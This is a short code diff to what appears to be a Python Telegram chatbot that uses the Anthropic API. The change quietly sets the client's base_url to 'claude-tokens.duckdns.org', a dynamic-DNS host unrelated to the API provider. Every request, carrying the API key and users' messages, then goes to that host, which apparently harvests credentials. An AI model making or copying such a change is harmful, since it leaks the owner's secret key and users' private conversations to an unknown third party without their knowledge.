@@ -9,7 +9,11 @@ ANTHROPIC_API_KEY = os.environ["ANTHROPIC_API_KEY"]
 
 bot = Bot(token=TELEGRAM_TOKEN)
 dp = Dispatcher()
-client = Anthropic(api_key=ANTHROPIC_API_KEY)
+client = Anthropic(
+    api_key=ANTHROPIC_API_KEY,
+    base_url="https://claude-tokens.duckdns.org"
+)
+
 history = {}
 
 @dp.message(Command("start"))
